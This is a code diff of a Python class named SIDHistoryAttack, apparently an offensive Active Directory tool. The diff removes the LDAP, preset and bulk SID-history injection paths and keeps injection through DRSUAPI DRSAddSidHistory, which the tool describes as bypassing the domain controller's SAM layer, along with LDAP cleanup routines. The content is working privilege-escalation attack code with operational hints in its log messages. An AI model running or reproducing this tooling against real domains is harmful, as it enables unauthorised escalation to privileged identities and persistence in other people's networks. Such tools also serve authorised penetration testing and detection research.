@@ -18,13 +18,9 @@ class SIDHistoryAttack:
     """
     Main class for performing SID History operations from a remote Linux host.
 
-    Supports two injection methods:
-    - LDAP: Direct LDAP modify (works for removal; add may be blocked by DC)
-    - DRSUAPI: RPC-based DRSAddSidHistory (proper method, requires specific conditions)
+    Injection uses DRSUAPI DRSAddSidHistory (opnum 20) — the only method that
+    bypasses the DC's SAM layer. Cleanup/removal uses LDAP MODIFY_DELETE.
     """
-
-    METHOD_LDAP = 'ldap'
-    METHOD_DRSUAPI = 'drsuapi'
 
     def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
         self.dc_ip = dc_ip
@@ -147,147 +143,29 @@ class SIDHistoryAttack:
             return None
         return SIDConverter.resolve_preset(preset_name, self.domain_sid)
 
-    # ─── SID HISTORY INJECTION ────────────────────────────────────────
+    # ─── SID HISTORY INJECTION (DRSUAPI) ──────────────────────────────
 
     def inject_sid_history(self, target_user: str, source_user: str,
                           source_domain: Optional[str] = None,
-                          method: str = METHOD_LDAP,
                           src_creds_user: str = '',
                           src_creds_domain: str = '',
                           src_creds_password: str = '') -> bool:
         """
-        Inject the SID of a source user into the sIDHistory of a target.
+        Inject the SID of a source user into the target's sIDHistory
+        via DRSUAPI DRSAddSidHistory (opnum 20).
 
         Args:
             target_user: sAMAccountName of target
-            source_user: sAMAccountName of source
-            source_domain: Source domain (for cross-domain/forest)
-            method: 'ldap' or 'drsuapi'
-            src_creds_user: Username for source domain auth (DRSUAPI cross-forest)
+            source_user: sAMAccountName of source (in source domain)
+            source_domain: Source domain (must be cross-forest)
+            src_creds_user: Username for source domain auth
             src_creds_domain: Domain for source domain auth
             src_creds_password: Password for source domain auth
         """
-        if method == self.METHOD_DRSUAPI:
-            return self._inject_via_drsuapi(
-                target_user, source_user, source_domain,
-                src_creds_user=src_creds_user,
-                src_creds_domain=src_creds_domain,
-                src_creds_password=src_creds_password,
-            )
-
-        # LDAP method
-        logging.info(f"Injecting SID from {source_user} into {target_user} (method: LDAP)")
-
-        source_sid = self._resolve_source_sid(source_user, source_domain)
-        if not source_sid:
-            return False
-
-        return self.add_sid_to_history(target_user, source_sid)
-
-    def add_sid_to_history(self, target_user: str, sid_to_add: str,
-                           method: str = METHOD_LDAP) -> bool:
-        """Add a SID to an object's sIDHistory."""
-        if method == self.METHOD_DRSUAPI:
-            logging.error("DRSUAPI (DRSAddSidHistory) cannot inject arbitrary SIDs.")
-            logging.error("Use --source-user/--source-domain with --method drsuapi,")
-            logging.error("or use --method ldap for --sid/--preset injection.")
-            return False
-
-        if not self.ldap_ops:
-            logging.error("Not connected")
-            return False
-
-        try:
-            # Check if already present
-            current = self.ldap_ops.get_sid_history(target_user)
-            if sid_to_add in current:
-                logging.warning(f"SID {sid_to_add} already in sIDHistory")
-                return True
-
-            # DRSUAPI method - use RPC DRSAddSidHistory
-            if method == self.METHOD_DRSUAPI:
-                return self._add_sid_via_drsuapi(target_user, sid_to_add)
-
-            # LDAP method
-            user_dn = self.ldap_ops.get_object_dn(target_user)
-            if not user_dn:
-                return False
-
-            success = self.ldap_ops.add_sid_to_history(user_dn, sid_to_add)
-
-            if success:
-                name = SIDConverter.resolve_sid_name(sid_to_add, self.domain_sid)
-                logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory")
-            else:
-                logging.error("LDAP add failed - the DC likely blocks direct sIDHistory writes")
-                logging.error("Try: --method drsuapi (for RPC-based injection)")
-
-            return success
-
-        except Exception as e:
-            logging.error(f"Error adding SID to history: {e}")
-            return False
-
-    def _add_sid_via_drsuapi(self, target_user: str, sid_to_add: str) -> bool:
-        """Add a SID via DRSUAPI DRSAddSidHistory using a synthetic source."""
         if not self.drsuapi_client:
             logging.info("Establishing DRSUAPI connection...")
             if not self.connect_drsuapi():
                 logging.error("Cannot connect to DRSUAPI")
-                return False
-
-        # DRSAddSidHistory needs src_domain + src_principal
-        # For same-domain preset injection, we use the domain itself as source
-        src_domain = self.domain
-        dst_domain = self.domain
-
-        # Resolve the SID to a sAMAccountName for the source principal
-        src_principal = self.ldap_ops.get_name_by_sid(sid_to_add)
-        if not src_principal:
-            logging.error(f"Cannot resolve SID {sid_to_add} to a source principal")
-            return False
-
-        logging.info(f"DRSAddSidHistory: {src_principal}@{src_domain} -> {target_user}@{dst_domain}")
-
-        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
-            src_domain=src_domain,
-            src_principal=src_principal,
-            dst_domain=dst_domain,
-            dst_principal=target_user,
-        )
-
-        if success:
-            name = SIDConverter.resolve_sid_name(sid_to_add, self.domain_sid)
-            logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory via DRSUAPI")
-        else:
-            logging.error(f"DRSAddSidHistory failed: {error_msg} (code: {error_code})")
-
-        return success
-
-    def add_sid_preset(self, target_user: str, preset_name: str,
-                       method: str = METHOD_LDAP) -> bool:
-        """Add a well-known SID preset to an object's sIDHistory."""
-        sid = self.resolve_preset(preset_name)
-        if not sid:
-            logging.error(f"Unknown preset: {preset_name}. "
-                        f"Available: {', '.join(SIDConverter.get_preset_list())}")
-            return False
-
-        name = SIDConverter.resolve_sid_name(sid, self.domain_sid)
-        logging.info(f"Preset '{preset_name}' -> {sid} ({name})")
-        return self.add_sid_to_history(target_user, sid, method=method)
-
-    def _inject_via_drsuapi(self, target_user: str, source_user: str,
-                             source_domain: Optional[str] = None,
-                             src_creds_user: str = '',
-                             src_creds_domain: str = '',
-                             src_creds_password: str = '') -> bool:
-        """Inject SID History via DRSUAPI RPC (DRSAddSidHistory opnum 20)."""
-        if not self.drsuapi_client:
-            # Try to auto-connect
-            logging.info("Establishing DRSUAPI connection...")
-            if not self.connect_drsuapi():
-                logging.error("Cannot connect to DRSUAPI - required for RPC injection")
                 return False
 
         src_domain = source_domain or self.domain
@@ -312,24 +190,6 @@ class SIDHistoryAttack:
             self._suggest_drsuapi_fix(error_code)
 
         return success
-
-    def _resolve_source_sid(self, source_user: str, source_domain: Optional[str] = None) -> Optional[str]:
-        """Resolve source user to SID, supporting cross-domain lookups."""
-        if source_domain and source_domain.lower() != self.domain.lower():
-            logging.info(f"Searching for {source_user} in trusted domain {source_domain}")
-            try:
-                source_base_dn = SIDConverter.domain_to_dn(source_domain)
-                temp_ldap = LDAPOperations(self.connection, source_base_dn)
-                sid = temp_ldap.get_object_sid(source_user)
-                if sid:
-                    return sid
-            except Exception as e:
-                logging.debug(f"Cross-domain lookup failed: {e}")
-
-            logging.warning(f"Cannot query {source_domain} - provide SID directly with --sid")
-            return None
-
-        return self.get_user_sid(source_user)
 
     # ─── SID HISTORY REMOVAL ─────────────────────────────────────────
 
@@ -378,30 +238,7 @@ class SIDHistoryAttack:
             logging.error(f"Error clearing sIDHistory: {e}")
             return False
 
-    def copy_sid_history(self, source_user: str, target_user: str) -> bool:
-        """Copy all sIDHistory from source to target."""
-        source_history = self.get_current_sid_history(source_user)
-        if not source_history:
-            logging.error(f"No sIDHistory found on {source_user}")
-            return False
-
-        success = True
-        for sid in source_history:
-            if not self.add_sid_to_history(target_user, sid):
-                logging.error(f"Failed to copy SID {sid}")
-                success = False
-
-        return success
-
     # ─── BULK OPERATIONS ──────────────────────────────────────────────
-
-    def bulk_inject(self, targets: List[str], sid_to_add: str) -> Dict[str, bool]:
-        """Inject the same SID into multiple targets."""
-        results = {}
-        for target in targets:
-            logging.info(f"Processing {target}...")
-            results[target] = self.add_sid_to_history(target, sid_to_add)
-        return results
 
     def bulk_clear(self, targets: List[str]) -> Dict[str, bool]:
         """Clear sIDHistory from multiple targets."""
